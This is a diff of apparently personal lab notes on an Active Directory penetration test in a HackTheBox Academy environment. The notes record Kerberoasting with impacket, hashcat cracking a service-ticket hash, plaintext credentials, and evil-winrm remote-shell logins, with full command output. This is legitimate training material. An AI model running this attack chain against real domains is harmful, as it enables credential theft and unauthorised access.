@@ -1663,6 +1663,80 @@ SMB         172.16.8.3      445    DC01             SYSVOL          READ        
 
 ```
 
+## Kerberoasting
+
+```bash
+impacket-GetUserSPNs INLANEFREIGHT.LOCAL/ssmalls -dc-ip 172.16.8.3 -request -outputfile spn.hash 
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+ServicePrincipalName                         Name          MemberOf  PasswordLastSet             LastLogon                   Delegation 
+-------------------------------------------  ------------  --------  --------------------------  --------------------------  ----------
+adfsconnect/azure01.inlanefreight.local      azureconnect            2022-06-01 14:32:56.506935  <never>                                
+backupjob/veam001.inlanefreight.local        backupjob               2022-06-01 14:33:00.038178  <never>                                
+MSSQLSvc/DB01.inlanefreight.local:1433       mssqlsvc                2022-06-01 14:32:31.178803  <never>                                
+MSSQLSvc/DEVTEST.inlanefreight.local:1433    sqltest                 2022-06-01 14:32:45.522556  <never>                                
+MSSQLSvc/QA001.inlanefreight.local:1433      sqlqa                   2022-06-01 14:32:49.256932  <never>                                
+MSSQLSvc/SQL-DEV01.inlanefreight.local:1433  sqldev                  2022-06-01 14:32:41.913173  <never>                                
+MSSQLSvc/SQL-WEB01.inlanefreight.local:1433  mssqladm                2022-06-01 14:32:52.897615  2022-06-23 00:45:20.688469             
+MSSQLSvc/SQL01.inlanefreight.local:1433      svc_sql                 2022-06-01 14:32:34.850677  <never>                                
+MSSQLSvc/SQL02.inlanefreight.local:1433      sqlprod                 2022-06-01 14:32:38.381946  <never>                                
+SAP/APP01.inlanefreight.local                sapsso                  2022-06-01 14:33:07.225672  <never>                                
+SAPsvc/SAP01.inlanefreight.local             sapvc                   2022-06-01 14:33:10.678799  <never>                                
+vmware/vc.inlanefreight.local                vmwarescvc              2022-06-01 14:33:03.600665  <never>
+```
+
+backupjob creds
+
+ ```
+  hashcat -m 13100 spn.hash /usr/share/wordlists/rockyou.txt
+hashcat (v7.1.2) starting
+
+OpenCL API (OpenCL 3.0 PoCL 7.1+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 21.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================================
+* Device #01: cpu-sandybridge-AMD Ryzen 7 5700G with Radeon Graphics, 1468/2937 MB (1468 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+Minimum salt length supported by kernel: 0
+Maximum salt length supported by kernel: 256
+
+Hashes: 12 digests; 12 unique digests, 12 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory allocated for this attack: 513 MB (1786 MB free)
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+$krb5tgs$23$*backupjob$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/backupjob*$f7d4201e3999e2e43ccec8218a8ba597$5f03453046a5de9c320efe321e60f549b6b1bc2cd1dbf954939bc57ceaddae689180f037fe0290dbcc895fb321c87fed6d3361f49c6e4617b66a7dde56509942f808afa97d0b5941d77787f578a1c9e1683d85b187fbf63caf96b441671cae0dc003d5fe7dc9ab0b42b9f984dfc8aaa87826e9b6d04b85ae8ca311b9958f9a765b1ba0f04b1199b86e340898d90f50ad4478c3bfa4833401a09fc6b03c8a3c4f8dc4c9a7233eaca54e0d96ea51b4d7b562d4b66edd3b33abfcb305dc3a0913f20751db1d9d9b96ee55e69b7de2226d106be60b42f957323caadedd1a1dc9bef4a12f6091e69da8b3004e151762b7976126230c34f6d0ea6f68e66a3791090a8a05569cb4de3a231f512b160fae1125e2633fa8a95975f77d9be282d123857088d9c18cb3673948226daa07a031d7f394d37548124ece3a367f3f4c761b73b5e0a67145d7bf3ea2d08527bc8b6494533afb6f0632b449a32303b70c9abda1ce7c47e5c7bacb1e5495ad96a7e34bca910e6077d1837dd0b1cac07959648bd6d3379ab138e060aea63e9303b910b0874d5a79b2606f2ae529dcda802a32edc41b236a93fc5a5fd8354b660204811a4118f9ec4c830bb208bc3f757fa44856644b3124423d3df64377c08db65f9f3abc0ec66b0ee3c4a240e84d38e4cf28627059202896f0cbfe7c6f3796ec47c121ab65bda3584011029867fe9857dfd64f5b23b94427efdc5a4af7c40cea79328fc496645a513093a35a100258a4a689741e3f155e1e1bf282d7ca9bd731718d8216928d3287853e415e0139182e544164961c5f84717e375a47553816aaaea82e54ab46499c6e7dc9f24d16dad0fbc54855121d130221bf6135d7dbf65809154493ece1f772c6a0c99c8b92e14a766484377bd038d5ec6fb83d1309716298f17a92bbd0b9d871041a56e39910d127ee0ad1b8829da4bfa1253f307f8ff3d8b5ae2a27cc27ef7b664e3a0fbadc261c2ac7bd1f742cd30cf64d7a4e0c8584055d4c53a3ffa35439429c7b486848c0094e279f4f36c6e572d91f6abd1c6c7307749aeff96caa81a56f0efcbe090036388d0818854e86394273899cc84db7d327266dd89b30dc87d08bc7feea235ee529e3929f89a1608b3a9f62181a073ca2c1ece3057186d8a59f83fd61c086dfa500f3d924a48db4c23ddf433797eb1ade50df835298bfbed56109830b0c13886279b70aa8dc651303f0c4d30bf474bc331e37d2e75a1e0e77fb2ace7ee99042de9edd61d9b93d4153c6bb54318fbafab198a81a110f5ff6a4fa8b911be234471ab86884de54325c8974e2e779e15cc5ec994b084d12149d507e9b315bd0d4e7715cafe380d11d360331ecd26c88511773c9b339:lucky7
+
+ ```
+
+```
+nxc smb 172.16.8.3 -u backupjob -p lucky7       
+SMB         172.16.8.3      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\backupjob:lucky7 
+                                                                                              
+```
+
+useless account
+
 ```bash
 smbmap -u ssmalls -p Password123! -H 172.16.8.3 -r 'Department Shares' --depth 5
 
@@ -1884,123 +1958,47 @@ SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\back
 
 ```
 
-## Kerberoastable users
-
 ```bash
-bloodyAD --host 172.16.8.3 -d INLANEFREIGHT.LOCAL -u 'backupadm' -p '!qazXSW@' get search --filter '(&(samAccountType=805306368)(servicePrincipalName=*))' --attr sAMAccountName
-
-distinguishedName: CN=azureconnect,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
-sAMAccountName: azureconnect
-
-distinguishedName: CN=backupjob,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
-sAMAccountName: backupjob
-
-distinguishedName: CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
-sAMAccountName: krbtgt
-
-distinguishedName: CN=mssqlsvc,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
-sAMAccountName: mssqlsvc
-
-distinguishedName: CN=sqltest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
-sAMAccountName: sqltest
-
-distinguishedName: CN=sqlqa,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
-sAMAccountName: sqlqa
-
-distinguishedName: CN=sqldev,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
-sAMAccountName: sqldev
-
-distinguishedName: CN=mssqladm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
-sAMAccountName: mssqladm
-
-distinguishedName: CN=svc_sql,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
-sAMAccountName: svc_sql
-
-distinguishedName: CN=sqlprod,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
-sAMAccountName: sqlprod
-
-distinguishedName: CN=sapsso,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
-sAMAccountName: sapsso
-
-distinguishedName: CN=sapvc,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
-sAMAccountName: sapvc
-
-distinguishedName: CN=vmwarescvc,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
-sAMAccountName: vmwarescvc
-
+ nxc winrm 172.16.8.50 -u backupadm -p '!qazXSW@'
+WINRM       172.16.8.50     5985   ACADEMY-AEN-MS0  [*] Windows 10 / Server 2019 Build 17763 (name:ACADEMY-AEN-MS0) (domain:INLANEFREIGHT.LOCAL) 
+WINRM       172.16.8.50     5985   ACADEMY-AEN-MS0  [+] INLANEFREIGHT.LOCAL\backupadm:!qazXSW@ (Pwn3d!)
 ```
 
-## Kerberoasting
-
 ```bash
-impacket-GetUserSPNs INLANEFREIGHT.LOCAL/hporter -dc-ip 172.16.8.3 -request -outputfile spn.hash       
-Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
-
-Password:
-ServicePrincipalName                         Name          MemberOf  PasswordLastSet             LastLogon                   Delegation 
--------------------------------------------  ------------  --------  --------------------------  --------------------------  ----------
-adfsconnect/azure01.inlanefreight.local      azureconnect            2022-06-01 14:32:56.506935  <never>                                
-backupjob/veam001.inlanefreight.local        backupjob               2022-06-01 14:33:00.038178  <never>                                
-MSSQLSvc/DB01.inlanefreight.local:1433       mssqlsvc                2022-06-01 14:32:31.178803  <never>                                
-MSSQLSvc/DEVTEST.inlanefreight.local:1433    sqltest                 2022-06-01 14:32:45.522556  <never>                                
-MSSQLSvc/QA001.inlanefreight.local:1433      sqlqa                   2022-06-01 14:32:49.256932  <never>                                
-MSSQLSvc/SQL-DEV01.inlanefreight.local:1433  sqldev                  2022-06-01 14:32:41.913173  <never>                                
-MSSQLSvc/SQL-WEB01.inlanefreight.local:1433  mssqladm                2022-06-01 14:32:52.897615  2022-06-23 00:45:20.688469             
-MSSQLSvc/SQL01.inlanefreight.local:1433      svc_sql                 2022-06-01 14:32:34.850677  <never>                                
-MSSQLSvc/SQL02.inlanefreight.local:1433      sqlprod                 2022-06-01 14:32:38.381946  <never>                                
-SAP/APP01.inlanefreight.local                sapsso                  2022-06-01 14:33:07.225672  <never>                                
-SAPsvc/SAP01.inlanefreight.local             sapvc                   2022-06-01 14:33:10.678799  <never>                                
-vmware/vc.inlanefreight.local                vmwarescvc              2022-06-01 14:33:03.600665  <never>  
+ evil-winrm -i 172.16.8.50 -u backupadm -p '!qazXSW@'
 ```
 
-backupjob creds
+ ```bash
+ *Evil-WinRM* PS C:\Users\backupadm\Desktop> cd c:\
+*Evil-WinRM* PS C:\> ls
 
- ```
-  hashcat -m 13100 spn.hash /usr/share/wordlists/rockyou.txt
-hashcat (v7.1.2) starting
 
-OpenCL API (OpenCL 3.0 PoCL 7.1+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 21.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
-====================================================================================================================================================
-* Device #01: cpu-sandybridge-AMD Ryzen 7 5700G with Radeon Graphics, 1468/2937 MB (1468 MB allocatable), 4MCU
+    Directory: C:\
 
-Minimum password length supported by kernel: 0
-Maximum password length supported by kernel: 256
-Minimum salt length supported by kernel: 0
-Maximum salt length supported by kernel: 256
 
-Hashes: 12 digests; 12 unique digests, 12 unique salts
-Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
-Rules: 1
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         6/1/2022   2:17 PM                panther
+d-----        2/25/2022  10:20 AM                PerfLogs
+d-r---        6/22/2022  11:47 PM                Program Files
+d-----         6/1/2022   2:23 PM                Program Files (x86)
+d-r---       11/14/2026  11:54 AM                Users
+d-----        6/23/2022  12:07 AM                Windows
+-a----         6/1/2022   2:17 PM         186880 budget_data.xlsx
+-a----         6/1/2022   2:21 PM           2190 Inlanefreight.kdbx
 
-Optimizers applied:
-* Zero-Byte
-* Not-Iterated
 
-ATTENTION! Pure (unoptimized) backend kernels selected.
-Pure kernels can crack longer passwords, but drastically reduce performance.
-If you want to switch to optimized kernels, append -O to your commandline.
-See the above message to find out about the exact limits.
+*Evil-WinRM* PS C:\> cd panther
+*Evil-WinRM* PS C:\panther> ls
 
-Watchdog: Temperature abort trigger set to 90c
 
-Host memory allocated for this attack: 513 MB (1786 MB free)
+    Directory: C:\panther
 
-Dictionary cache hit:
-* Filename..: /usr/share/wordlists/rockyou.txt
-* Passwords.: 14344385
-* Bytes.....: 139921507
-* Keyspace..: 14344385
 
-$krb5tgs$23$*backupjob$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/backupjob*$f7d4201e3999e2e43ccec8218a8ba597$5f03453046a5de9c320efe321e60f549b6b1bc2cd1dbf954939bc57ceaddae689180f037fe0290dbcc895fb321c87fed6d3361f49c6e4617b66a7dde56509942f808afa97d0b5941d77787f578a1c9e1683d85b187fbf63caf96b441671cae0dc003d5fe7dc9ab0b42b9f984dfc8aaa87826e9b6d04b85ae8ca311b9958f9a765b1ba0f04b1199b86e340898d90f50ad4478c3bfa4833401a09fc6b03c8a3c4f8dc4c9a7233eaca54e0d96ea51b4d7b562d4b66edd3b33abfcb305dc3a0913f20751db1d9d9b96ee55e69b7de2226d106be60b42f957323caadedd1a1dc9bef4a12f6091e69da8b3004e151762b7976126230c34f6d0ea6f68e66a3791090a8a05569cb4de3a231f512b160fae1125e2633fa8a95975f77d9be282d123857088d9c18cb3673948226daa07a031d7f394d37548124ece3a367f3f4c761b73b5e0a67145d7bf3ea2d08527bc8b6494533afb6f0632b449a32303b70c9abda1ce7c47e5c7bacb1e5495ad96a7e34bca910e6077d1837dd0b1cac07959648bd6d3379ab138e060aea63e9303b910b0874d5a79b2606f2ae529dcda802a32edc41b236a93fc5a5fd8354b660204811a4118f9ec4c830bb208bc3f757fa44856644b3124423d3df64377c08db65f9f3abc0ec66b0ee3c4a240e84d38e4cf28627059202896f0cbfe7c6f3796ec47c121ab65bda3584011029867fe9857dfd64f5b23b94427efdc5a4af7c40cea79328fc496645a513093a35a100258a4a689741e3f155e1e1bf282d7ca9bd731718d8216928d3287853e415e0139182e544164961c5f84717e375a47553816aaaea82e54ab46499c6e7dc9f24d16dad0fbc54855121d130221bf6135d7dbf65809154493ece1f772c6a0c99c8b92e14a766484377bd038d5ec6fb83d1309716298f17a92bbd0b9d871041a56e39910d127ee0ad1b8829da4bfa1253f307f8ff3d8b5ae2a27cc27ef7b664e3a0fbadc261c2ac7bd1f742cd30cf64d7a4e0c8584055d4c53a3ffa35439429c7b486848c0094e279f4f36c6e572d91f6abd1c6c7307749aeff96caa81a56f0efcbe090036388d0818854e86394273899cc84db7d327266dd89b30dc87d08bc7feea235ee529e3929f89a1608b3a9f62181a073ca2c1ece3057186d8a59f83fd61c086dfa500f3d924a48db4c23ddf433797eb1ade50df835298bfbed56109830b0c13886279b70aa8dc651303f0c4d30bf474bc331e37d2e75a1e0e77fb2ace7ee99042de9edd61d9b93d4153c6bb54318fbafab198a81a110f5ff6a4fa8b911be234471ab86884de54325c8974e2e779e15cc5ec994b084d12149d507e9b315bd0d4e7715cafe380d11d360331ecd26c88511773c9b339:lucky7
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         6/1/2022   2:17 PM           6995 unattend.xml
 
  ```
 
-```
-nxc smb 172.16.8.3 -u backupjob -p lucky7       
-SMB         172.16.8.3      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\backupjob:lucky7 
-                                                                                              
-```
-
-useless account
 
